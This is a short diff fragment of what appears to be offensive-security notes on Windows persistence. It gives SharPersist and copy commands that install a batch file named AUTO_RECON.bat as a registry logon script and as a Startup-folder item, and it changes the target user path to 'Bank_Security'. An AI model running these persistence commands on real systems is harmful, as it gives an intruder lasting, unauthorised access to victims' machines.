@@ -14,7 +14,7 @@ SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_
 SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_RECON.bat" -k "logonscript" -m add
 
 STARTUP FOLDER Basic:
-copy C:\Windows\Temp\AUTO_RECON.bat "C:\Users\Marco\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AUTO_RECON.bat"
+copy C:\Windows\Temp\AUTO_RECON.bat "C:\Users\Bank_Security\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AUTO_RECON.bat"
 
 REGISTRY KEY:
 CURRENT USER:
